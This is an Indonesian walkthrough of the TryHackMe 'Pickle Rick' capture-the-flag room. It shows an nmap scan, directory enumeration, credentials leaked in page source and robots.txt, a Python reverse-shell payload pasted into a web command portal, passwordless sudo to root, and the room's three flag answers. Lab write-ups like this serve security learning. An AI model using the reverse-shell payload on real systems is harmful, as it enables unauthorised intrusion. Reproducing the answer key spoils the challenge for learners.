# CTF - Pickle Rick
- TryHackMe Challenge: https://tryhackme.com/room/picklerick
- IP Machine: 10.10.172.106

# Nmap Report
- Lakukan port scanning dengan tool `nmap`
```sh
nmap -sV -A <IP Machine>
```
- Berikut ini adalah hasil port scanning
```sh
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -A 10.10.172.106
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 19:44 EDT
Nmap scan report for 10.10.172.106
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f6bbf9e8176b483c616e7fe7b3dc6ad2 (RSA)
|   256 9d8527a53623d37ba397cb9f308841ae (ECDSA)
|_  256 cc423adf1180534d8445e1357c2cac92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/29%OT=22%CT=1%CU=36558%PV=Y%DS=2%DC=T%G=Y%TM=64C5A47
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%II=I%TS=8)SEQ(SP=1
OS:04%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O
OS:3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   193.06 ms 10.8.0.1
2   195.02 ms 10.10.172.106

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.35 seconds
```

## Gobuster
- Lakukan pencarian direktori web tersembunyi dengan tool `gobuster`
```sh
gobuster dir -u http://<IP Machine> -w /usr/share/dirb/wordlists/commont.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%201.JPG)

## Content Discovery
- Buka halaman web `http://<IP_machine>` di browser

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%202.JPG)

- Tekan **Ctrl+U** atau klik kanan pada halaman lalu pilih **View Page Source** untuk menampilkan source code halaman. Disini ditemukan informasi bahwa usernamenya adalah **R1ckRul3s**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%203.JPG)
![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%204.JPG)

- Buka halaman `http://<IP_machine>/robots.txt` di tab baru. Pada halaman ini ditemukan sebuah password

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%205.JPG)

```sh
username: R1ckRul3s
password: Wubbalubbadubdub
```

## Gain Access
- Lakukan login ke halaman `http://<IP_machine>/login.php` dengan username dan password yang ditemukan diatas

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%206.JPG)

- Setelah login berhasil, halaman langsung di redirect ke halaman portal.php

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%207.JPG)

- Jika kita ketik `ls` lalu tekan Execute maka diperoleh daftar file sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%208.JPG)

- Terdapat sebauh file `Sup3rS3cretPick13Ingred.txt` disana. Jika kita ketik perintah `cat Sup3rS3cretPick13Ingred.txt` lalu tekan tombol **Execute** maka muncul pesan bahwa command tersebut telah di block sehingga kita tidak bisa membaca isi file tersebut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%209.JPG) 

- Kita bisa memanfaatkan command reverse shell untuk bisa masuk ke dalam shell server. Untuk itu kita harus membuat listener netcat terlebih dahulu di terminal dan kita atur di port `4444`. Anda juga bisa menggunakan port lain
```sh
nc -lnvp 4444
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)

- Gunakan Payload berikut untuk menjalankan reverse shell. Ganti **10.8.142.62** dengan IP tun0 pada komputer yang anda gunakan
```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.142.62",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```
- Copy payload diatas dan paste ke halaman `http://<IP_machine>/portal.php` lalu tekan tombol **Execute**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)

- Netcat berhasil terkoneksi dan masuk sebagai user **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2012.JPG)

- Setelah berhasil masuk ke dalam shell kita bisa membaca isi file **Sup3rS3cretPick13Ingred.txt**
```sh
cat Sup3rS3cretPick13Ingred.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2013.JPG)

- Di directory **/home** ditemukan home directory **rick**. Navigasi ke directory **/home/rick** dan disana ditemukan file **second ingredients**
```sh
cd /home/rick
cat 'second ingredients'
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2014.JPG)

## Privilege Escalation
- Final ingredient sepertinya ditaruh di direktori **/root**. Untuk bisa mengakses direktori tersebut diperlukan akses user root sehingga kita melakukan privilege escalation.
- Untuk mendapatkan akses user root, kita perlu mengubah shell menjadi terminal interaktif dengan perintah dibawah ini. Setelah kita coba, ternyata kita mengakses user root hanya dengan perintah `sudo bash` tanpa memasukkan password
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo bash
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2015.JPG)

- Setelah berhasil masuk sebagai user root, navigasi ke directory **/root** maka disini ditemukan file **3rd.txt** yang berisi final ingredient. Buka file tersebut dengan perintah `cat 3rd.txt`
```sh
cd /root
cat 3rd.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2016.JPG)

## Pertanyaan dan Jawaban:

- **Pertanyaan:** What is the first ingredient that Rick needs?
```sh
mr. meeseek hair
```

- **Pertanyaan:** What is the second ingredient in Rick’s potion?
```sh
1 jerry tear
```

- **Pertanyaan:** What is the last and final ingredient?
```sh
fleeb juice
```